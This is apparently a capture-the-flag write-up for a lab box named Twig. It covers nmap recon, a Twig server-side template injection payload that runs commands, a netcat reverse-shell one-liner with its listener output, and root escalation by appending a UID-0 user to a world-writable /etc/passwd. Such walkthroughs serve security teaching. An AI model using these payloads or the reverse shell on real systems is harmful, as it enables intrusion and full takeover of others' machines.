# Twig
Twig is a linux box that use Twig as a tempalte engine

# Recon
Start with nmap scan:
```
nmap -sC -sV 10.0.101.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 21:27 EDT
Nmap scan report for 10.0.101.1
Host is up (0.11s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: HackerENV - CTF Challenges

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds
```
There is only one port open which is port **80**

If we browse to it we will see this:

![image1](https://github.com/electronicbots/HackerEnv/blob/main/Machines/twig/images/1.png)

And if we open the page source, we get this hint:

```html
...
</body>

<!-- do you know that TWIG is a tempalte engine -->

</html>
...
```

So that it is using a **twig** as a tempalte engine.

## User Flag
A simple google search will lead to this exploit: https://www.exploit-db.com/exploits/44102

```
2. POC:
http://localhost/search?search_key={{4*4}} 
OUTPUT: 4
```
So we can test it like this:

![image2](https://github.com/electronicbots/HackerEnv/blob/main/Machines/twig/images/2.png)

We can tell it is vulnerable. If you search for "twig template injection payload" you should find this PDF: https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf

If you go to Twig section you will find a payload that you can use to inject a command, and it is this one:
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

![image3](https://github.com/electronicbots/HackerEnv/blob/main/Machines/twig/images/3.png)

And we can now run some commands, let's get a reverse shell with this:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <port> >/tmp/f
```

Make sure you start a listener befor you run it:

```
kali@kali:/$ nc -nlvp 5555
listening on [any] 5555 ...                                                                                                                                                                                                                
connect to [10.10.0.102] from (UNKNOWN) [10.0.101.1] 35660                                                                                                                                                                                 
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get the first flag:
```
www-data_flag:93f5b03...78fbec89
```

## Root Flag
If you run **linPEAS** script you will find that you have write access on **/etc/passwd**. we can confirm that with **ls**:
```
www-data@twig:/$ ls -lha /etc/passwd
ls -lha /etc/passwd
-rwxrwxrwx 1 root root 919 Oct 12 07:00 /etc/passwd
```

You can use any method to generate the password hash, I used perl just to test it out:
```
www-data@twig:/$ perl -le 'print crypt("pass123", "abc")'
perl -le 'print crypt("pass123", "abc")'
abBxjdJQWn8xw
```
now we just need to add this line at the end of **/etc/passwd**:
```
z0l:abBxjdJQWn8xw:0:0:/root/root:/bin/bash
```
```
www-data@twig:/$ echo "z0l:abBxjdJQWn8xw:0:0:/root/root:/bin/bash" >> /etc/passwd
<xjdJQWn8xw:0:0:/root/root:/bin/bash" >> /etc/passwd
```
You can now use **sudo su** to get a shell as **root**:
```
www-data@twig:/$ su z0l
su z0l
Password: pass123

# id
id
uid=0(root) gid=0(root) groups=0(root)
```
Get the root flag:
```
root_flag:7e4c330...c52ccd0f
```

Thanks for reading and you can find me here on Twitter: https://twitter.com/electronicbots
